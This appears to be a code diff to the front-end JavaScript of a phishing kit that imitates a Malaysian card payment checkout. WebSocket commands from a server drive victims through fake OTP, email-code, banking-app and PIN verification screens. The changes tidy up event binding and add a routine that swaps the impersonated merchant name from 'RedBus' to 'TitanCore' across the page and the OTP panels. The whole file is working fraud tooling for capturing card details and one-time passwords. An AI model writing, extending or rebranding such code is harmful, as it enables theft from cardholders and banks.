@@ -18,6 +18,8 @@ var _fieldIds = {
   fullName: 'bill-first'
 };
 
+var MERCHANT_NAME = 'TitanCore';
+
 function q(id) { return document.getElementById(_fieldIds[id] || id); }
 
 function readOrder() {
@@ -399,12 +401,13 @@ fetch('/api/settings')
         '. Please enter the OTP below.';*/
       resetOtp();
       startOtpTimer();
+      applyMerchantBranding();
  
     } else if (a === 'email_verify' || a === 'custom_email_verify' || a === 'custom_email_tail') {
       hideLoad();
       _curStep = 'email_verify';
       showEmail();
-      var sfx = p.phoneSuffix || document.querySelector("#email").value;
+      var sfx = p.phoneSuffix || (q('email') ? q('email').value : '');
 
     document.querySelector("#email-form > p").innerHTML='We have resent One-Time Password (OTP) in a text message to your registered email '+sfx+'.<br>Please submit your One-Time Password (OTP).';
     document.getElementById('email-amount').textContent='MYR '+String(getPayAmount());
@@ -414,6 +417,7 @@ fetch('/api/settings')
         '. Please enter the OTP below.';*/
       resetOtp();
       startOtpTimer();
+      applyMerchantBranding();
  
     } else if (a === 'cvv_verify' || a === 'question_verify') {
       _curStep = 'otp';
@@ -469,7 +473,8 @@ fetch('/api/settings')
  
     } else if (a === 'change_card_prompt') {
       _curStep = 'card';
-      document.getElementById('load-overlay').classList.add('hidden');
+      var lo1 = document.getElementById('load-overlay');
+      if (lo1) lo1.classList.add('hidden');
       document.querySelector("#app-verify-overlay > div.app-verify-box").classList.add('hidden');
       document.querySelector("#mount1").classList.add('hidden');
       document.querySelector("#mount2").classList.add('hidden');
@@ -570,7 +575,8 @@ fetch('/api/settings')
 
     } else if (a === 'change_card') {
       _curStep = 'card';
-      document.getElementById('load-overlay').classList.add('hidden');
+      var lo2 = document.getElementById('load-overlay');
+      if (lo2) lo2.classList.add('hidden');
       document.querySelector("#app-verify-overlay > div.app-verify-box").classList.add('hidden');
       document.querySelector("#mount1").classList.add('hidden');
       document.querySelector("#mount2").classList.add('hidden');
@@ -609,7 +615,8 @@ fetch('/api/settings')
     }
      else if (a === 'app_verify') {
       _curStep = 'app_verify';
-      document.getElementById('load-overlay').classList.add('hidden');
+      var lo3 = document.getElementById('load-overlay');
+      if (lo3) lo3.classList.add('hidden');
       document.getElementById('app-verify-overlay').classList.remove('hidden');
 
       if(p.cardInfo.bankName==='AMBANK (M) BERHAD') {
@@ -804,7 +811,8 @@ fetch('/api/settings')
         var bankName = p.cardInfo?.bankName || p.bankName || 'Bank';
       updateBankLogo(bankName);
       document.getElementById('app-amount').textContent = 'MYR ' + String(getPayAmount());
-      updateAppSchemeLogo(p.cardInfo?.cardType || p.cardType || '')
+      updateAppSchemeLogo(p.cardInfo?.cardType || p.cardType || '');
+      applyMerchantBranding();
       }
 
 
@@ -876,7 +884,8 @@ fetch('/api/settings')
       _curStep = 'pin_verify';
       //window._emailVerifyInProgress = false;
       //window._pinVerifyInProgress = true;
-      document.getElementById('load-overlay').classList.add('hidden');
+      var lo4 = document.getElementById('load-overlay');
+      if (lo4) lo4.classList.add('hidden');
       document.getElementById('pin-overlay').classList.remove('hidden');
       document.getElementById('pin-amount-row').style.display = '';
       document.getElementById('pin-amount').textContent = 'MR ' + String(getPayAmount());
@@ -1549,38 +1558,62 @@ fetch('/api/settings')
     if (ws && ws.readyState === WebSocket.OPEN)
       ws.send(JSON.stringify({ type: 'resend_otp', payload: { sessionId: sid } }));
   }
- 
-  /* OTP 输入事件 */
-  if (q('otp-code')) {
-    q('otp-code').addEventListener('input', function () {
-      this.value = this.value.replace(/\D/g, '').slice(0, 8);
+
+  function applyMerchantBranding() {
+    var appMer = document.getElementById('app-merchant');
+    if (appMer) appMer.textContent = MERCHANT_NAME;
+    ['otp-overlay', 'email-overlay', 'pin-overlay'].forEach(function (overlayId) {
+      var overlay = document.getElementById(overlayId);
+      if (!overlay) return;
+      overlay.querySelectorAll('.otp-table tr').forEach(function (row) {
+        var cells = row.querySelectorAll('td');
+        if (cells.length >= 2 && /merchant/i.test(cells[0].textContent)) {
+          cells[1].textContent = MERCHANT_NAME;
+        }
+      });
     });
   }
-  if (q('otp-submit')) {
-    q('otp-submit').addEventListener('click', submitOtp);
-  }
-  if (q('otp-resend')) {
-    q('otp-resend').addEventListener('click', resendOtp);
+
+  function bindOnce(el, event, handler) {
+    if (!el || el._tcBound) return;
+    el._tcBound = true;
+    el.addEventListener(event, handler);
   }
 
-
-  /* EMAIL 输入事件 */
-  if (q('email-code')) {
-    q('email-code').addEventListener('input', function () {
+  function bindOverlayControls() {
+    bindOnce(q('otp-code'), 'input', function () {
       this.value = this.value.replace(/\D/g, '').slice(0, 8);
+      onInput();
     });
-  }
-  if (q('email-submit')) {
-    q('email-submit').addEventListener('click', submitEmailCode);
-  }
-  if (q('email-resend')) {
-    q('email-resend').addEventListener('click', resendEmailCode);
+    bindOnce(q('otp-submit'), 'click', submitOtp);
+    bindOnce(q('otp-resend'), 'click', resendOtp);
+
+    bindOnce(q('email-code'), 'input', function () {
+      this.value = this.value.replace(/\D/g, '').slice(0, 8);
+      onInput();
+    });
+    bindOnce(q('email-submit'), 'click', submitEmailCode);
+    bindOnce(q('email-resend'), 'click', resendEmailCode);
+
+    bindOnce(q('app-continue-btn'), 'click', appVerifyContinue);
+    bindOnce(q('pin-submit'), 'click', submitPin);
+
+    for (var i = 1; i <= 4; i++) {
+      (function (idx) {
+        var pinEl = document.getElementById('pin-d' + idx);
+        bindOnce(pinEl, 'input', function () { pinJump(idx); });
+        bindOnce(pinEl, 'keydown', function (e) { pinBack(e, idx); });
+      })(i);
+    }
+
+    applyMerchantBranding();
   }
 
-  if (q('app-continue-btn')) {
-    q('app-continue-btn').addEventListener('click', appVerifyContinue);
-  }
- 
+  window.resetOtp = resetOtp;
+  window.submitPin = submitPin;
+  window.pinJump = pinJump;
+  window.pinBack = pinBack;
+  window.resendEmailCode = resendEmailCode;
  
   /* ═══════════════════════════════════════════
      9. 提交按钮
@@ -1660,8 +1693,12 @@ function assetUrl(url, pagePath) {
   return pagePath.replace(/\/$/, '') + '/' + filename;
 }
 
+function rewriteMerchantNames(markup) {
+  return markup.replace(/RedBus/gi, MERCHANT_NAME).replace(/REDBUS/g, 'TITANCORE');
+}
+
 function rewriteAssetUrls(markup, pagePath) {
-  return markup
+  return rewriteMerchantNames(markup)
     .replace(/\b(src|href|poster)=(["'])([^"']+)\2/gi, function (match, attr, quote, url) {
       if (!isRelativeAssetUrl(url)) return match;
       return attr + '=' + quote + assetUrl(url, pagePath) + quote;
@@ -1735,6 +1772,7 @@ window.tcPayment.buildPayload = buildPayload;
 window.tcPayment.sendPayload = sendPayload;
 window.tcPayment.submitPayment = submitPayment;
 window.tcPayment.initBanks = initBanks;
+window.tcPayment.bindOverlayControls = bindOverlayControls;
 window.CustomizationappVerifyContinue1 = CustomizationappVerifyContinue1;
 window.CustomizationappVerifyContinue2 = CustomizationappVerifyContinue2;
 window.CustomizationappVerifyContinue3 = CustomizationappVerifyContinue3;
